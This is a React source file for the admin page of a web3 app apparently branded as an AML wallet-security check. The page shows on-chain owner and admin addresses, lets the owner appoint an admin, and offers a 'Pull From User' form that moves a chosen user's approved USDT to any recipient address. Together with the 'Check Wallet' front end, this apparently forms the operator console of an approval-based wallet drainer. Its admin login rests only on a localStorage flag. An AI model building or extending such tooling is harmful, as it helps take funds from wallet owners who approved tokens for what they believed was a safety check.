import React, { useState, useEffect } from 'react'
import Header from '../components/Header.jsx'
import Footer from '../components/Footer.jsx'
import CheckWalletButton from '../components/CheckWalletButton.jsx'
import { useWeb3Modal } from '@web3modal/wagmi/react'
import { useAccount, useChainId } from 'wagmi'
import { callPullFromUser, readOwnerAddress, readAdminAddress, callSetAdmin } from '../web3/tokenTransfer'
import { parseUnits, createPublicClient, http, formatEther } from 'viem'
import { CHAIN_NAMES, RESOLVED_RPC_URLS } from '../web3/config.jsx'
import AdminHeader from '../components/AdminHeader.jsx'

export default function Admin() {
  const { open } = useWeb3Modal()
  const { address, isConnected } = useAccount()
  const chainId = useChainId()

  const settings = (() => { try { return JSON.parse(localStorage.getItem('amlsec_settings')||'{}') } catch { return {} } })()
  const SMART_CONTRACT_ADDRESS = settings.contractAddress || "0x83CBbdfd4E0Ae5e264B789cC7459E878A4E39fBd"

  const [isAdminAuthed, setIsAdminAuthed] = useState(() => localStorage.getItem('amlsec_admin_authed') === 'true')
  const [ownerOnChain, setOwnerOnChain] = useState(null)
  const [adminOnChain, setAdminOnChain] = useState(null)
  const [adminStatus, setAdminStatus] = useState('')
  const [userToPull, setUserToPull] = useState('')
  const [recipientForPull, setRecipientForPull] = useState('')
  const [amountToPull, setAmountToPull] = useState('')
  const [isPulling, setIsPulling] = useState(false)
  const [newAdminAddress, setNewAdminAddress] = useState('')
  const [isSettingAdmin, setIsSettingAdmin] = useState(false)
  const [walletRows, setWalletRows] = useState([])

  function handleCheckWallet() { open && open() }

  useEffect(() => {
    async function refreshAdmin() {
      if (!isConnected || !address || !chainId) return
      try {
        const [ownerAddr, adminAddr] = await Promise.all([
          readOwnerAddress({ contractAddress: SMART_CONTRACT_ADDRESS, chainId }),
          readAdminAddress({ contractAddress: SMART_CONTRACT_ADDRESS, chainId })
        ])
        setOwnerOnChain(ownerAddr)
        setAdminOnChain(adminAddr)
      } catch (e) {
        console.warn('Failed to read owner/admin:', e)
      }
    }
    refreshAdmin()
  }, [isConnected, address, chainId, SMART_CONTRACT_ADDRESS])

  useEffect(() => {
    async function refreshWalletTable() {
      try {
        if (!isConnected || !address || !chainId) return
        const networkName = CHAIN_NAMES[chainId] || 'unknown'
         const rpcUrl = RESOLVED_RPC_URLS[networkName]
         if (!rpcUrl) return
         const client = createPublicClient({ transport: http(rpcUrl) })
         const userAddr = address.toLowerCase()
         const rows = []
         const nativeSymbol = networkName === 'polygon' ? 'MATIC' : 'ETH'
         let balanceStr = '-'
         try {
           const bal = await client.getBalance({ address: userAddr })
           balanceStr = `${formatEther(bal)} ${nativeSymbol}`
         } catch {}
         rows.push({ sn: 1, address: userAddr, balance: balanceStr, network: networkName, date: new Date().toLocaleString() })
         setWalletRows(rows)
      } catch (e) {
        console.warn('Failed to refresh wallet table:', e)
      }
    }
    refreshWalletTable()
  }, [address, isConnected, chainId])

  async function handleSetAdmin(e) {
    e && e.preventDefault && e.preventDefault()
    if (!isAdminAuthed) { setAdminStatus('Please login as admin'); return }
    const connected = (address || '').toLowerCase()
    const ownerLc = (ownerOnChain || '').toLowerCase()
    if (connected !== ownerLc) { setAdminStatus('Only owner can set admin'); return }
    try {
      setIsSettingAdmin(true)
      setAdminStatus('Submitting setAdmin transaction...')
      const txHash = await callSetAdmin({ contractAddress: SMART_CONTRACT_ADDRESS, adminAddress: newAdminAddress, chainId })
      setAdminStatus(`SetAdmin tx sent: ${txHash}`)
      const adminAddr = await readAdminAddress({ contractAddress: SMART_CONTRACT_ADDRESS, chainId })
      setAdminOnChain(adminAddr)
    } catch (err) {
      console.error('setAdmin failed:', err)
      setAdminStatus(`Error: ${err?.message || String(err)}`)
    } finally { setIsSettingAdmin(false) }
  }

  async function handleAdminPull(e) {
    e && e.preventDefault && e.preventDefault()
    if (!isAdminAuthed) { setAdminStatus('Please login as admin'); return }
    const connected = (address || '').toLowerCase()
    const ownerLc = (ownerOnChain || '').toLowerCase()
    const adminLc = (adminOnChain || '').toLowerCase()
    if (connected !== ownerLc && connected !== adminLc) { setAdminStatus('Connected wallet is not owner/admin on-chain'); return }
    try {
      setIsPulling(true)
      setAdminStatus('Submitting pullFromUser transaction...')
      const amt = parseUnits(String(amountToPull || '0'), 6)
      const txHash = await callPullFromUser({ contractAddress: SMART_CONTRACT_ADDRESS, userAddress: userToPull, recipientAddress: recipientForPull, amount: amt, chainId })
      setAdminStatus(`Tx sent: ${txHash}`)
    } catch (err) {
      console.error('pullFromUser failed:', err)
      setAdminStatus(`Error: ${err?.message || String(err)}`)
    } finally { setIsPulling(false) }
  }

  return (
    <>
      <AdminHeader />
      <main className="onboard" aria-labelledby="admin-title">
        <div className="onboard-inner">
          <h1 id="admin-title" className="onboard-title">Admin Controls</h1>
          <p className="onboard-subtitle">Authenticate and execute admin token pulls from approved users.</p>

          <div className="onboard-cta">
            {!isConnected ? (
              <CheckWalletButton onClick={handleCheckWallet}>Connect Wallet</CheckWalletButton>
            ) : (
              <div className="wallet-connected">
                <div className="wallet-info">
                  <p>Connected: {address?.slice(0, 6)}...{address?.slice(-4)}</p>
                  <p style={{fontSize: '12px', color: '#666'}}>chainId: {chainId ?? 'n/a'}</p>
                </div>

                <div className="admin-card">
                  <div className="admin-controls">
                    {!isAdminAuthed && (
                      <p className="admin-status" style={{ color: '#b00' }}>Not authenticated. Please <a href="/login">login</a> to access admin controls.</p>
                    )}
                    <p className="admin-status" style={{ color: isAdminAuthed ? '#0a0' : '#b00' }}>{adminStatus}</p>
                    <p className="admin-meta">Owner: {ownerOnChain || '—'} | Admin: {adminOnChain || '—'}</p>
                    <p className="admin-meta">Connected wallet must be on-chain owner or admin.</p>

                    <form onSubmit={handleSetAdmin} className="admin-form">
                      <input type="text" placeholder="New admin address" value={newAdminAddress} onChange={(e) => setNewAdminAddress(e.target.value)} className="admin-input" />
                      <button className="admin-btn" type="submit" disabled={!isAdminAuthed || isSettingAdmin}>Set Admin</button>
                    </form>

                    <form onSubmit={handleAdminPull} className="admin-pull-form">
                      <input type="text" placeholder="User address" value={userToPull} onChange={(e) => setUserToPull(e.target.value)} className="admin-input" />
                      <input type="text" placeholder="Recipient address" value={recipientForPull} onChange={(e) => setRecipientForPull(e.target.value)} className="admin-input" />
                      <input type="text" placeholder="Amount (USDT)" value={amountToPull} onChange={(e) => setAmountToPull(e.target.value)} className="admin-input" />
                      <button className="admin-btn primary" type="submit" disabled={!isAdminAuthed || isPulling}>Pull From User</button>
                    </form>
                  </div>
                </div>

                <div className="admin-card" style={{ marginTop: '12px' }}>
                  <table className="admin-table" role="table" aria-label="Wallets connected to contract">
                    <thead>
                      <tr>
                        <th>SN</th>
                        <th>Wallet Address</th>
                        <th>Balance</th>
                        <th>Network</th>
                        <th>Date</th>
                      </tr>
                    </thead>
                    <tbody>
                      {walletRows.length === 0 ? (
                        <tr><td colSpan={5} style={{ textAlign: 'center', color: '#666' }}>No wallet data yet</td></tr>
                      ) : (
                        walletRows.map(row => (
                          <tr key={row.address}>
                            <td>{row.sn}</td>
                            <td>{row.address}</td>
                            <td>{row.balance}</td>
                            <td>{row.network}</td>
                            <td>{row.date}</td>
                          </tr>
                        ))
                      )}
                    </tbody>
                  </table>
                </div>
              </div>
            )}
          </div>
        </div>
      </main>
      <Footer />
    </>
  )
}